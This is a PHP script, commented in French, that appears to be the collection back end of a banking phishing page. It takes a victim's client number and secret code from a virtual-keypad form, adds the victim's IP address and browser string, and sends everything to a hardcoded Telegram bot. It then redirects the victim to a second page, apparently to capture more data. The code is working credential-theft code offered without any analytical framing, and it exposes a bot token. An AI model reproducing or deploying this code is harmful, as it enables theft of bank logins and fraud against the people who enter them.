<?php
// =================================================================
// CONFIGURATION
// =================================================================
$botToken = '8473826447:AAFqM5Efirefhh3AoU8y7AL9IxcamlyAVzU';
$chatId = '6705594800';

// =================================================================
// RÉCUPÉRATION DES DONNÉES DU FORMULAIRE (PAGE 1)
// =================================================================
// Le numéro client vient du champ avec name="client"
$clientNumber = $_POST['client'] ?? 'Non renseigné';

// Le code secret est tapé via le clavier virtuel et stocké dans le champ caché
$secretCode = isset($_POST['code']) && !empty(trim($_POST['code'])) 
    ? trim($_POST['code']) 
    : 'Non renseigné';

// =================================================================
// PRÉPARATION ET ENVOI DU MESSAGE À TELEGRAM
// =================================================================
$message = "🔔 NOUVELLE TENTATIVE DE CONNEXION (Page 1)\n";
$message .= "-----------------------------------------\n";
$message .= "Numéro Client: " . htmlspecialchars($clientNumber) . "\n";
$message .= "Code Secret: " . htmlspecialchars($secretCode) . "\n";
$message .= "-----------------------------------------\n";
$message .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$message .= "User-Agent: " . htmlspecialchars($_SERVER['HTTP_USER_AGENT']) . "\n";

$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML' // Utilisez 'HTML' ou 'Markdown' pour un formatage
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Pour ne pas afficher la réponse de Telegram
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Bonne pratique pour la sécurité
curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// =================================================================
// REDIRECTION VERS LA PAGE 2
// =================================================================
// On redirige systématiquement vers la page suivante, peu importe si l'envoi a réussi.
header('Location: page2.html');
exit();

?>